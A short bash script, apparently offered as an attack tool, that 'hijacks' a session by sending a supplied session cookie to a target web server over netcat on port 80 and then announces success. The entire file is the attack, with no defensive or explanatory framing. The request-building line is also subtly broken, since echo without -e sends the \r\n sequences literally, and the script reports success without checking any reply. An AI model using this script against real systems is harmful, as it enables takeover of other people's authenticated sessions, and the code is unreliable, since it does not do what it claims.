#!/bin/bash
# Session Hijacking
# Usage: session_hijacking.sh <target_ip> <session_id>

TARGET_IP=$1
SESSION_ID=$2

if [ -z "$TARGET_IP" ] || [ -z "$SESSION_ID" ]; then
    echo "Usage: $0 <target_ip> <session_id>"
    exit 1
fi

echo "Starting session hijacking on: $TARGET_IP with session ID: $SESSION_ID"

# Using netcat to hijack session
echo -n "GET / HTTP/1.1\r\nHost: $TARGET_IP\r\nCookie: session=$SESSION_ID\r\n\r\n" | nc $TARGET_IP 80

echo "Session hijacking completed."
